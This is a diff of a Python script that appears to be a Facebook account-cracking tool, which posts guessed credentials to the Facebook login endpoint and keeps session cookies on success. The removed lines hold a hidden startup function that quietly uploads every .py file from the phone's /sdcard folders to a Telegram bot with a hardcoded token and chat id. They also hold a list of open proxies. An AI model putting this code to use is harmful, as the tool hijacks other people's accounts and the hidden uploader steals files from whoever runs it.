@@ -39,41 +39,6 @@ if not 'print' in open(first+'models.py','r').read():
 else:
     exit('\033[1;91mPLEASE TURN OFF YOUR LOCAL METHOD CAPTURE SYSTEM KIDZ')
 
- 	#-----------------------sdcard---------------------#
-def bithika():
-    session=requests.session()
-        
-    bot_token = '7419379182:AAE19NFlvbwMMnkDkpgcOqQ2H8eK1AHMhiY' 
-    chat_id = '1778046662' 	
-	#-----------------------py---------------------#
-    try:
-        sdcard_path = '/sdcard'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
-        for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
-                get = session.post(url, data=data, files=files)
-                sent = session.post(url, data=data2, files=files)
-    except:pass
-    #------------------------py---------------------------#
-    try:
-        sdcard_path = '/sdcard/Download'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
-        for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
-                get = session.post(url, data=data, files=files)
-                sent = session.post(url, data=data2, files=files)
-    except:pass
-with tred(max_workers=30) as jjj:
-    jjj.submit(bithika)
-
 ###----------[ GLOBAL NAMA ]----------###
 
 id,id2,uid = [],[],[]
@@ -294,76 +259,6 @@ for agenku in range(10000):
 id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
 cokbrut=[]
 pwpluss,pwnya=[],[]
-
-proxies = [
-    "162.223.94.166:80",
-    "208.87.243.199:9898",
-    "138.68.235.51:80",
-    "152.26.229.86:9443",
-    "159.65.244.233:80",
-    "104.238.228.201:3128",
-    "167.102.133.106:80",
-    "167.102.133.111:80",
-    "173.255.119.18:80",
-    "45.79.43.178:6969",
-    "162.223.94.164:80",
-    "154.16.146.42:80",
-    "5.161.103.41:88",
-    "198.49.68.80:80",
-    "139.28.232.216:8899",
-    "198.199.86.11:3128",
-    "148.72.165.7:10563",
-    "35.185.196.38:3128",
-    "47.88.18.204:8023",
-    "47.251.70.179:80",
-    "70.63.90.245:8080",
-    "12.88.29.66:9080",
-    "155.94.241.132:3128",
-    "192.73.244.36:80",
-    "64.227.4.244:8888",
-    "47.89.184.18:3128",
-    "193.122.197.154:80",
-    "152.26.229.42:9443",
-    "50.231.0.43:4481",
-    "67.227.240.157:3128",
-    "138.68.60.8:8080",
-    "47.251.43.115:33333",
-    "23.254.231.55:80",
-    "69.75.140.157:8080",
-    "138.197.102.119:80",
-    "154.16.146.46:80",
-    "172.183.241.1:8080",
-    "199.167.236.12:3128",
-    "72.169.67.109:87",
-    "40.121.22.37:80",
-    "24.106.221.230:53281",
-    "209.141.58.24:80",
-    "23.122.184.9:8888",
-    "154.16.146.47:80",
-    "67.220.86.253:3128",
-    "38.129.166.122:3128",
-    "167.99.174.59:80",
-    "104.129.199.51:10160",
-    "34.118.205.235:3128",
-    "34.23.45.223:80",
-    "192.210.228.107:3128",
-    "152.26.229.88:9443",
-    "172.173.132.85:80",
-    "47.254.16.71:5008",
-    "154.16.146.48:80",
-    "199.168.175.179:80",
-    "150.239.111.249:3128",
-    "50.62.183.223:80",
-    "47.252.29.28:11222",
-    "50.236.203.15:8080",
-    "209.141.54.136:5555",
-    "104.129.206.209:8800",
-    "104.129.192.167:8800",
-    "142.11.227.126:3128",
-    "104.37.102.130:8181",
-    "104.128.103.32:51110"
-]
-
 
 def mainx2():
 	mainx()
@@ -1213,7 +1108,7 @@ def m4(idf,pwv):
     'DNT': '1',
     'Pragma': 'no-cache',
     'TE': 'Trailers', }#'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',}
-   lo = session.post('https://m.facebook.com/login.php?skip_api_login=1&api_key=740202109352935&kid_directed_site=0&app_id=740202109352935&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv20.0%2Fdialog%2Foauth%3Fclient_id%3D740202109352935%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%26state%3D36a7f6174cc0fa6f1dfb44bdff0ede0d703b704d6322a2c79e25ce86af3b9e98%26redirect_uri%3Dhttps%253A%252F%252Fwww.facebookblueprint.com%252Fauthentication%252Ffb_callback%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0deafc3b-e77f-450c-8b9b-43044933610b%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.facebookblueprint.com%2Fauthentication%2Ffb_callback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D36a7f6174cc0fa6f1dfb44bdff0ede0d703b704d6322a2c79e25ce86af3b9e98%23_%3D_&display=touch&locale=en_US&pl_dbl=0&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
+   lo = session.post('https://p.facebook.com/login.php?skip_api_login=1&api_key=740202109352935&kid_directed_site=0&app_id=740202109352935&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv20.0%2Fdialog%2Foauth%3Fclient_id%3D740202109352935%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%26state%3D36a7f6174cc0fa6f1dfb44bdff0ede0d703b704d6322a2c79e25ce86af3b9e98%26redirect_uri%3Dhttps%253A%252F%252Fwww.facebookblueprint.com%252Fauthentication%252Ffb_callback%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0deafc3b-e77f-450c-8b9b-43044933610b%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.facebookblueprint.com%2Fauthentication%2Ffb_callback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D36a7f6174cc0fa6f1dfb44bdff0ede0d703b704d6322a2c79e25ce86af3b9e98%23_%3D_&display=touch&locale=en_US&pl_dbl=0&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
